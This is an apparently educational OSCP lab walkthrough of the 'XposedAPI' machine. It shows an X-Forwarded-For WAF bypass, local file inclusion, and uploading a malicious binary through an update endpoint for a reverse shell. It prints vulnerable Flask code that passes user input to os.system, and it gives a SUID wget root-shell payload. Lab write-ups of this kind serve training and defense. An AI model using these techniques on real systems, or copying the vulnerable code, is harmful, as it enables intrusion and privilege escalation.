---
title: XposedAPI
date: 2025-05-17
categories: [oscp, pg-practice]
tags: [oscp-preparation, walkthrough, WAF, X-Forwarded-For, LFI, suid-wget-privesc ] 
image: pg-logo.png
media_subpath: /assets/img/posts/2025-05-17-xposedapi/
---


## Introduction

In this walkthrough, we exploit the target by abusing an **API functionality** in a web application that lacks proper input validation. This flaw allows us to **upload and execute a malicious binary**, gaining initial access to the system. For privilege escalation, we take advantage of **misconfigured SUID permissions** on the `wget` binary.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 22

Version - OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

We usually skip SSH.

## Web

### Port 13337

Version - Gunicorn 20.0.4

![image.png](image%203.png)

- **Version**
    
    Let’s intercept the request using BurpSuite and check for request methods provided in the website.
    
    ![image.png](image%204.png)
    
    Some MD5 hash is also returned alongside with version number I tried to crack but unsuccessful, I am gonna put it inside loot.
    
    Version - 1.0.0b
    
- **Logs**
    
    I checked `GET` /logs but it says WAF: Access Denied for this Host.
    
- **Update**
    
    Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"} 
    
    I am gonna try to make Linux Executable and store in web server.
    
    ![image.png](image%205.png)
    
    We should find a valid user.
    
    Here I don’t have anything to proceed except for **Gunicorn.**

## Exploitaiton
    
When we are encountered with something like `WAF` when requesting the resource from the webserver always try to include `X-Forwarded-For` header in headers and bypass it.
    
    
> When someone visits a website, their request might go through a **proxy** or **load balancer** before reaching the actual server. In that case, the server usually **only sees the IP address of the proxy**, not the real user. To fix this, proxies often add a special HTTP header called **`X-Forwarded-For`**, which tells the server: this the IP address of the user requesting resource.
{: .prompt-info }
    
So I am gonna include `X-Forwarded-For` header with localhost IP address to fool the server that request is actually coming from localhost.
    
![image.png](image%206.png)
    
It says we should include `file=/path/to/file` , it just resembles LFI, so I tried and it really worked.
    
![image.png](image%207.png)
    
Now that we have a valid user I am gonna try the first thought about downloading our malicious file as an update to the server.
    
![image.png](image%208.png)
    
![image.png](image%209.png)
    
For now I didn’t get reverse shell:
    
![image.png](image%2010.png)
    
Let’s try to restart the system. I tried doing that from browser but it didn’t work maybe we should try from Burp.
    
![image.png](image%2011.png)
    
![image.png](image%2012.png)
    
Now we have shell.
    
![image.png](image%2013.png)
    

## Loot

- [ ]  Gunicorn 20.0.4
- [ ]  8f887f33975ead915f336f57f0657180 - hash returned checking version
- [ ]  Logs WAF

## Privilege Escalation

In the home directory of `clumsyadmin` we have `app` file this file is `elf` file maybe it is the one that we uploaded

```python
#!/usr/bin/env python3
from flask import Flask, jsonify, request, render_template, Response
from Crypto.Hash import MD5
import json, os, binascii
app = Flask(__name__)

@app.route('/')
def home():
    return(render_template("home.html"))

@app.route('/update', methods = ["POST"])
def update():
    if request.headers['Content-Type'] != "application/json":
        return("Invalid content type.")
    else:
        data = json.loads(request.data)
        if data['user'] != "clumsyadmin":
            return("Invalid username.")
        else:
            os.system("curl {} -o /home/clumsyadmin/app".format(data['url']))
            return("Update requested by {}. Restart the software for changes to take effect.".format(data['user']))

@app.route('/logs')
def readlogs():
  if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
  else:
        ip = "1.3.3.7"
  if ip == "localhost" or ip == "127.0.0.1":
    if request.args.get("file") == None:
        return("Error! No file specified. Use file=/path/to/log/file to access log files.", 404)
    else:
        data = ''
        with open(request.args.get("file"), 'r') as f:
            data = f.read()
            f.close()
        return(render_template("logs.html", data=data))
  else:
       return("WAF: Access Denied for this Host.",403)

@app.route('/version')
def version():
    hasher = MD5.new()
    appHash = ''
    with open("/home/clumsyadmin/app", 'rb') as f:
        d = f.read()
        hasher.update(d)
        appHash = binascii.hexlify(hasher.digest()).decode()
    return("1.0.0b{}".format(appHash))

@app.route('/restart', methods = ["GET", "POST"])
def restart():
    if request.method == "GET":
        return(render_template("restart.html"))
    else:
        os.system("killall app")
        os.system("bash -c '/home/clumsyadmin/app&'")
        return("Restart Successful.")
```

Reading `main.py` in webapp folder we ensured that it is.

I enumerated gunicorn files but didn’t find anything interesting.

- **OSCP Checklist**
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [ ]  Password Authentication Abuse
    - [ ]  Hunting Sensitive Information
    - [ ]  Sudo 
    - [ ]  SUID/SGID
    - [ ]  Capabilities
    - [ ]  Cron Jobs Abuse
    - [ ]  Kernel Exploits
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles
    

I can’t see my `sudo` privileges as I don’t have password for clumsyadmin, maybe we should look for it after checked `SUID` binaries.

```python
find / -perm -u=s -type f 2>/dev/null
```

![image.png](image%2014.png)

```python
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
/usr/bin/wget --use-askpass=$TF 0
```

![image.png](image%2015.png)

Now our effective ID is root.

## Mitigation

- **Restrict API functionalities** and ensure proper **authentication and validation** on file uploads.
- Avoid granting **SUID permissions** to binaries like `wget` that can be misused to alter system-critical files.
- Implement **AppArmor/SELinux policies** to control file access behavior of binaries.
